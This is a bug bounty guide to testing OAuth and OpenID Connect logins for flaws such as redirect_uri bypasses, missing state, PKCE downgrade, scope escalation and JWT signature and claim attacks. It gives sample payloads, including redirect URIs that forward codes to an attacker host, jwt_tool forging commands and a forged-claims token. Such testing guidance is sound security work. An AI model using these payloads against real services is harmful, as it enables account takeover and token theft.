Key Takeaways

  • OAuth/OIDC bugs consistently pay critical-tier bounties because they lead directly to account takeover
  • Most OAuth implementations still fail on redirect_uri validation — test open redirects, path traversal, and subdomain matching
  • PKCE is mandatory in OAuth 2.1 but many apps still use the implicit flow or skip the code_verifier — always check
  • OIDC claim injection (email, sub, aud) can let you impersonate any user if the relying party trusts claims without verification
  • The state parameter prevents CSRF in OAuth flows — removing it is often accepted as a medium-severity finding
  • Token storage matters: access tokens in localStorage are vulnerable to XSS, and refresh tokens without rotation enable persistent access

Why OAuth/OIDC Bugs Are High-Value Targets

OAuth 2.0 and OpenID Connect power authentication on most modern web applications. When you click "Sign in with Google" or "Login with GitHub," you're using OAuth/OIDC. Every implementation is a potential attack surface, and the bugs you find here lead directly to account takeover — the vulnerability class that pays the highest bounties.

The reason these bugs persist is complexity. OAuth 2.0 has multiple grant types, each with different security properties. OIDC adds an identity layer with ID tokens, claims, and discovery endpoints. Developers frequently misunderstand the spec, skip validation steps, or mix grant types inappropriately. As a bug bounty hunter, your job is to find where the implementation diverges from the spec.

This guide covers the complete testing methodology: from mapping the OAuth/OIDC implementation to exploiting specific vulnerability classes. Every technique described here has produced real bounty payouts.

Understanding the Attack Surface

OAuth 2.0 Grant Types You'll Encounter

Before testing, identify which grant type the application uses. Each has different attack vectors:

  • Authorization Code Flow — The most common for web apps. The client receives a code, exchanges it for tokens server-side. Attack vectors: code interception, redirect_uri manipulation, CSRF via missing state parameter.
  • Authorization Code + PKCE — Required by OAuth 2.1. Adds a code_verifier/code_challenge pair. Attack vectors: PKCE downgrade (removing code_challenge), weak code_challenge_method (plain instead of S256).
  • Implicit Flow — Deprecated in OAuth 2.1 but still widely deployed. Tokens returned directly in the URL fragment. Attack vectors: token leakage via referrer headers, open redirect token theft.
  • Client Credentials — Machine-to-machine. No user interaction. Attack vectors: client secret exposure, overly broad scopes.
  • Device Code Flow — Used for smart TVs, CLI tools. Attack vectors: user code brute-force, polling endpoint abuse, social engineering via phishing the verification URL.

OIDC-Specific Components

When OIDC is in play, you have additional attack surface:

  • ID Token (JWT) — Contains identity claims (sub, email, name). Attack vectors: signature bypass, claim injection, audience confusion.
  • UserInfo Endpoint — Returns user profile data. Attack vectors: IDOR if the endpoint doesn't validate the access token properly.
  • Discovery Endpoint (/.well-known/openid-configuration) — Publishes the provider's configuration. Attack vectors: SSRF if the relying party fetches this dynamically from user-controlled input.
  • Nonce Parameter — Prevents ID token replay. Attack vectors: nonce reuse, missing nonce validation.

Phase 1: Reconnaissance and Flow Mapping

Identify the OAuth/OIDC Implementation

Start by mapping the complete authorization flow. Open Burp Suite, enable interception, and trigger the login flow:

# Look for these endpoints in your proxy history:
# Authorization endpoint
GET /authorize?response_type=code&client_id=...&redirect_uri=...&scope=...&state=...

# Token endpoint
POST /oauth/token
Content-Type: application/x-www-form-urlencoded
grant_type=authorization_code&code=...&redirect_uri=...&client_id=...

# OIDC discovery
GET /.well-known/openid-configuration

# UserInfo endpoint
GET /userinfo
Authorization: Bearer <access_token>

Document Every Parameter

For each request in the flow, record:

  • The response_type — tells you the grant type (code, token, id_token, or combinations)
  • The redirect_uri — your primary attack vector for token theft
  • The scope — what permissions are being requested
  • The state parameter — if missing, you have a CSRF finding immediately
  • The code_challenge and code_challenge_method — if missing, PKCE is not enforced
  • The nonce — if missing from an OIDC flow, ID token replay is possible

Check the Discovery Endpoint

If the target uses OIDC, fetch the discovery document:

curl -s https://target.com/.well-known/openid-configuration | jq .

This reveals the authorization endpoint, token endpoint, supported grant types, supported scopes, JWKS URI, and supported signing algorithms. The grant_types_supported field tells you which flows to test. The id_token_signing_alg_values_supported field tells you if weak algorithms like none or HS256 are accepted.

Phase 2: Redirect URI Manipulation

The redirect_uri is the most exploited parameter in OAuth. If you can redirect the authorization code or token to a domain you control, you have account takeover.

Test 1: Open Redirect on the Registered Domain

If the authorization server validates that redirect_uri starts with https://app.target.com, find an open redirect on that domain:

# If app.target.com/redirect?url=https://attacker.com exists:
redirect_uri=https://app.target.com/redirect?url=https://attacker.com/steal

The authorization server sees a valid domain. The open redirect forwards the code to your server.

Test 2: Path Traversal and Subdomain Matching

# Path traversal
redirect_uri=https://app.target.com/../attacker.com
redirect_uri=https://app.target.com/..%2F..%2Fattacker.com
redirect_uri=https://app.target.com%2F%2Fattacker.com

# Subdomain matching bypass
redirect_uri=https://attacker.target.com  (register this subdomain)
redirect_uri=https://app.target.com.attacker.com
redirect_uri=https://app-target.com  (register lookalike domain)

# Port manipulation
redirect_uri=https://app.target.com:8443/callback

# Fragment injection
redirect_uri=https://app.target.com/callback#@attacker.com

Test 3: Localhost and Special Schemes

Some authorization servers allow localhost for development. Test if this is enabled in production:

redirect_uri=http://localhost/callback
redirect_uri=http://127.0.0.1/callback
redirect_uri=http://[::1]/callback
redirect_uri=http://0.0.0.0/callback

Test 4: Implicit Flow Token Leakage

If the app uses the implicit flow (response_type=token), the access token is in the URL fragment. Any page the user navigates to after the redirect can read it via document.location.hash. Find an XSS on the redirect page, or a page that leaks the referrer.

Phase 3: State Parameter and CSRF

Test 5: Missing State Parameter

Remove the state parameter from the authorization request entirely. If the flow completes successfully, the application is vulnerable to OAuth CSRF — an attacker can force a victim to link the attacker's account.

# Original request
GET /authorize?response_type=code&client_id=abc&redirect_uri=https://app.target.com/callback&scope=openid&state=random123

# Modified — remove state
GET /authorize?response_type=code&client_id=abc&redirect_uri=https://app.target.com/callback&scope=openid

If the callback endpoint doesn't validate the state, report it. This is typically a medium-severity finding but can be escalated to high if it enables account linking attacks.

Test 6: Predictable or Reused State

Collect multiple state values. Check if they are:

  • Sequential or predictable (e.g., incrementing integers, timestamps)
  • Reused across sessions (same state for every login)
  • Short enough to brute-force

Phase 4: Authorization Code Attacks

Test 7: Code Reuse

Capture a valid authorization code and try to use it twice at the token endpoint. Per the spec (RFC 6749 §4.1.2), codes MUST be single-use. If the second request succeeds, the implementation is non-compliant and vulnerable to code replay.

Test 8: Code Without PKCE

If the authorization request includes code_challenge, try submitting the token request without code_verifier:

POST /oauth/token
grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://app.target.com/callback&client_id=abc
# Note: no code_verifier parameter

If the token endpoint returns tokens without verifying the PKCE challenge, the PKCE implementation is broken.

Test 9: PKCE Downgrade

Send the authorization request without code_challenge at all. If the server issues a code and the token endpoint accepts it without PKCE, the server doesn't enforce PKCE — meaning an attacker who intercepts the code can exchange it.

Test 10: Weak Code Challenge Method

# Try plain instead of S256
code_challenge_method=plain&code_challenge=my_verifier
# Then at token endpoint:
code_verifier=my_verifier

If plain is accepted, the code_challenge provides no security — an attacker who sees the challenge can derive the verifier trivially.

Phase 5: Scope Escalation

Test 11: Request Additional Scopes

Modify the scope parameter to request permissions beyond what the application normally asks for:

# Original
scope=openid email profile

# Escalated
scope=openid email profile admin
scope=openid email profile write:users
scope=openid email profile read:billing

If the authorization server grants the additional scopes without user consent, or if the application's backend doesn't validate the granted scopes, you have a privilege escalation finding.

Test 12: Scope Manipulation at Token Refresh

When refreshing an access token, try adding scopes that weren't in the original grant:

POST /oauth/token
grant_type=refresh_token&refresh_token=RT_VALUE&scope=openid email profile admin

The spec says refresh requests MUST NOT include scopes beyond the original grant. Many implementations don't enforce this.

Phase 6: Token Security

Test 13: Token Storage

Check where the application stores tokens:

  • localStorage — Vulnerable to XSS. Any script on the page can read localStorage.getItem('access_token'). If you find XSS, you can steal the token.
  • sessionStorage — Same XSS risk, but doesn't persist across tabs.
  • Cookies without HttpOnly — Accessible via JavaScript, same as localStorage.
  • Cookies with HttpOnly + Secure + SameSite — Best practice. Not directly accessible via XSS.

Test 14: Refresh Token Rotation

Use a refresh token, then try using the same refresh token again. If the server issues new tokens both times without revoking the old refresh token, an attacker with a stolen refresh token has persistent access even after the legitimate user refreshes.

Test 15: Token Revocation

After the user logs out or changes their password, check if previously issued access tokens and refresh tokens are still valid. Many applications don't implement token revocation, meaning stolen tokens remain usable indefinitely.

Phase 7: OIDC-Specific Attacks

Test 16: ID Token Signature Bypass

Decode the ID token (it's a JWT) and try:

# Algorithm none attack
# Change header to {"alg": "none"} and remove the signature
# Use jwt_tool:
python3 jwt_tool.py <id_token> -X a

# Algorithm confusion (RS256 → HS256)
# If the server uses RS256, try signing with HS256 using the public key as the HMAC secret
python3 jwt_tool.py <id_token> -X k -pk public_key.pem

Test 17: Claim Injection

If the relying party uses claims from the ID token (email, sub) to identify users without verifying the token signature or issuer, you can forge claims:

# Modify the email claim to impersonate another user
{
  "sub": "attacker-id",
  "email": "victim@target.com",
  "aud": "client-id",
  "iss": "https://auth.target.com"
}

This works when the relying party trusts the email claim for account matching without verifying the token came from the expected issuer.

Test 18: Audience Confusion

If multiple applications share the same identity provider, an ID token issued for App A might be accepted by App B. Capture an ID token from one application and replay it to another:

# Token issued for client_id=app-a
# Send it to app-b's token validation endpoint
# If app-b doesn't check the "aud" claim, you can authenticate as the user on app-b

Test 19: Nonce Reuse and Replay

Capture an ID token with a valid nonce. Replay the entire authorization response (code + ID token) in a new session. If the relying party doesn't track used nonces, the replayed token is accepted.

Phase 8: Social Login-Specific Attacks

Test 20: Account Linking Confusion

Many applications allow users to link multiple social accounts. Test this flow:

  1. Create Account A with email login
  2. Create Account B with Google login (using a different email)
  3. On Account A, initiate "Link Google Account" — but intercept the callback
  4. Send the callback to Account B's session

If the application doesn't validate that the OAuth callback belongs to the session that initiated it (via the state parameter), you can link your Google account to another user's account — giving you access to their account via Google login.

Test 21: Email Verification Trust

Some applications trust the email_verified claim from social providers without checking it. Register a social account with an unverified email matching the victim's email. If the application auto-links accounts based on email without checking email_verified, you get access to the victim's account.

Reporting OAuth/OIDC Vulnerabilities

OAuth bugs require clear proof of impact. Your report should include:

  • The exact flow — Which grant type, which endpoints, which parameters
  • Step-by-step reproduction — Every request/response in the attack chain
  • Impact statement — "An attacker can take over any user's account by..." or "An attacker can escalate privileges to admin by..."
  • Affected users — All users who authenticate via this flow, or a specific subset
  • Remediation — Reference the specific RFC section that the implementation violates

For redirect_uri findings, include a working proof-of-concept URL that demonstrates the redirect to your controlled domain. For token manipulation findings, include the modified JWT and the server's response accepting it.

Common Pitfalls When Testing

  • Don't test other users' accounts. All OAuth testing should use accounts you control. You're manipulating your own authorization flow, not accessing other people's data.
  • Don't confuse informational findings with vulnerabilities. An application using the implicit flow is not automatically a vulnerability — it's a design choice. The vulnerability is when the implicit flow enables token theft via a specific attack chain.
  • Don't ignore the token endpoint. Many hunters focus on the authorization endpoint and forget that the token endpoint has its own attack surface (code reuse, PKCE bypass, scope escalation on refresh).
  • Test the full chain. A redirect_uri bypass that only works with response_type=code is less impactful than one that works with response_type=token, because the code still needs to be exchanged server-side. Always demonstrate the complete attack path to token theft or account takeover.
